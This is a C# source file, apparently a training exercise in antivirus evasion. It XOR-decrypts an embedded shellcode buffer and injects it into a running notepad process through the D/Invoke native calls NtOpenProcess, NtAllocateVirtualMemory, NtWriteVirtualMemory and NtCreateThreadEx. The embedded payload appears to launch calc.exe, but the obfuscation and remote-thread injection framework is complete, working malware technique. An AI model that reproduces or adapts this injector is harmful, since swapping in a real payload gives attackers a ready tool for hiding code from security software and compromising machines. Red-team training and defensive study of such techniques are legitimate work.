﻿using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

// Hello world! We're using a Visual Studio project now
// This makes it much easier to manage .NET imports and dependencies (D/Invoke in this case)
// Make sure D/Invoke is installed by right-clicking in the solution explorer and selecting 'Manage NuGet packages' 
// Additionally, we can use the Costura.Fody package to embed the "Dinvoke.dll" file within our executable
using static DInvoke.Data.Win32;
using static DInvoke.Data.Native;
using static DInvoke.DynamicInvoke.Native;

// Base code taken from Exercise 3, refer there if anything is unclear

namespace Injector
{
    public class BasicAVEvasion
    {
        private static uint key = 0x37;

        private static byte[] xorDecryptBytes(byte[] encrypted)
        {
            byte[] decrypted = new byte[encrypted.Length];
            for (int i = 0; i < encrypted.Length; i++)
            {
                decrypted[i] = (byte)((uint)encrypted[i] ^ key);
            }
            return decrypted;
        }

        private static string xorDecryptString(byte[] encrypted)
        {
            string decrypted = "";
            for (int i = 0; i < encrypted.Length; i++)
            {
                decrypted += (char)((uint)encrypted[i] ^ key);
            }
            return decrypted;
        }

        // We can get rid of P/Invoke, we're using D/Invoke now! 😎

        public static void Main()
        {

            byte[] scEnc = new byte[296] {
                0xcb, 0x7f, 0xb4, 0xd3, 0xc7, 0xdf, 0xf7, 0x37, 0x37, 0x37, 0x76, 0x66, 0x76, 0x67, 0x65,
                0x66, 0x61, 0x7f, 0x06, 0xe5, 0x52, 0x7f, 0xbc, 0x65, 0x57, 0x7f, 0xbc, 0x65, 0x2f, 0x7f,
                0xbc, 0x65, 0x17, 0x7f, 0xbc, 0x45, 0x67, 0x7f, 0x38, 0x80, 0x7d, 0x7d, 0x7a, 0x06, 0xfe,
                0x7f, 0x06, 0xf7, 0x9b, 0x0b, 0x56, 0x4b, 0x35, 0x1b, 0x17, 0x76, 0xf6, 0xfe, 0x3a, 0x76,
                0x36, 0xf6, 0xd5, 0xda, 0x65, 0x76, 0x66, 0x7f, 0xbc, 0x65, 0x17, 0xbc, 0x75, 0x0b, 0x7f,
                0x36, 0xe7, 0xbc, 0xb7, 0xbf, 0x37, 0x37, 0x37, 0x7f, 0xb2, 0xf7, 0x43, 0x50, 0x7f, 0x36,
                0xe7, 0x67, 0xbc, 0x7f, 0x2f, 0x73, 0xbc, 0x77, 0x17, 0x7e, 0x36, 0xe7, 0xd4, 0x61, 0x7f,
                0xc8, 0xfe, 0x76, 0xbc, 0x03, 0xbf, 0x7f, 0x36, 0xe1, 0x7a, 0x06, 0xfe, 0x7f, 0x06, 0xf7,
                0x9b, 0x76, 0xf6, 0xfe, 0x3a, 0x76, 0x36, 0xf6, 0x0f, 0xd7, 0x42, 0xc6, 0x7b, 0x34, 0x7b,
                0x13, 0x3f, 0x72, 0x0e, 0xe6, 0x42, 0xef, 0x6f, 0x73, 0xbc, 0x77, 0x13, 0x7e, 0x36, 0xe7,
                0x51, 0x76, 0xbc, 0x3b, 0x7f, 0x73, 0xbc, 0x77, 0x2b, 0x7e, 0x36, 0xe7, 0x76, 0xbc, 0x33,
                0xbf, 0x7f, 0x36, 0xe7, 0x76, 0x6f, 0x76, 0x6f, 0x69, 0x6e, 0x6d, 0x76, 0x6f, 0x76, 0x6e,
                0x76, 0x6d, 0x7f, 0xb4, 0xdb, 0x17, 0x76, 0x65, 0xc8, 0xd7, 0x6f, 0x76, 0x6e, 0x6d, 0x7f,
                0xbc, 0x25, 0xde, 0x60, 0xc8, 0xc8, 0xc8, 0x6a, 0x7f, 0x8d, 0x36, 0x37, 0x37, 0x37, 0x37,
                0x37, 0x37, 0x37, 0x7f, 0xba, 0xba, 0x36, 0x36, 0x37, 0x37, 0x76, 0x8d, 0x06, 0xbc, 0x58,
                0xb0, 0xc8, 0xe2, 0x8c, 0xd7, 0x2a, 0x1d, 0x3d, 0x76, 0x8d, 0x91, 0xa2, 0x8a, 0xaa, 0xc8,
                0xe2, 0x7f, 0xb4, 0xf3, 0x1f, 0x0b, 0x31, 0x4b, 0x3d, 0xb7, 0xcc, 0xd7, 0x42, 0x32, 0x8c,
                0x70, 0x24, 0x45, 0x58, 0x5d, 0x37, 0x6e, 0x76, 0xbe, 0xed, 0xc8, 0xe2, 0x74, 0x0d, 0x6b,
                0x40, 0x5e, 0x59, 0x53, 0x58, 0x40, 0x44, 0x6b, 0x44, 0x4e, 0x44, 0x43, 0x52, 0x5a, 0x04,
                0x05, 0x6b, 0x54, 0x56, 0x5b, 0x54, 0x19, 0x52, 0x4f, 0x52, 0x37
            };

            byte[] notepadEnc = new byte[7] {
                0x59, 0x58, 0x43, 0x52, 0x47, 0x56, 0x53
            };

            Process[] expProc = Process.GetProcessesByName(xorDecryptString(notepadEnc));
            if (expProc.Length == 0)
            {
                return;
            }

            uint pid = (uint)expProc[0].Id;

            // D/Invoke supports Win32 APIs, but we choose to use Native (NTDLL) APIs here
            // Note that some D/Invoke function delegates differ from the actual API

            // Call NtOpenProcess (native equivalent of OpenProcess)
            IntPtr procHandle = NtOpenProcess(
                pid,
                Kernel32.ProcessAccessFlags.PROCESS_ALL_ACCESS
                );

            // Prepare NtAllocateVirtualMemory variables
            IntPtr baseAddr = IntPtr.Zero;
            IntPtr regionSize = (IntPtr)scEnc.Length;

            // Call NtAllocateVirtualMemory (native equivalent of VirtualAllocEx)
            IntPtr memAddr = NtAllocateVirtualMemory(
                procHandle,
                ref baseAddr,
                IntPtr.Zero,
                ref regionSize,
                Kernel32.MEM_COMMIT | Kernel32.MEM_RESERVE,
                WinNT.PAGE_EXECUTE_READWRITE
                );

            // We can decrypt the payload as usual
            byte[] sc = xorDecryptBytes(scEnc);

            // Get IntPtr to our shellcode
            var scBuf = Marshal.AllocHGlobal(sc.Length);
            Marshal.Copy(sc, 0, scBuf, sc.Length);

            // Call NtWriteVirtualMemory (native equivalent of WriteProcessMemory)
            uint procMemResult = NtWriteVirtualMemory(
                procHandle,
                baseAddr,
                scBuf,
                (uint)sc.Length
                );

            // Free the allocated memory
            Marshal.FreeHGlobal(scBuf);

            // Prepare NtCreateThreadEx variables
            IntPtr hThread = IntPtr.Zero;

            // Call NtCreateThreadEx (native equivalent of CreateRemoteThread)
            NTSTATUS tAddr = NtCreateThreadEx(
                ref hThread,
                WinNT.ACCESS_MASK.MAXIMUM_ALLOWED,
                IntPtr.Zero,
                procHandle,
                baseAddr,
                IntPtr.Zero,
                false,
                0,
                0,
                0,
                IntPtr.Zero
                );

        }
    }
}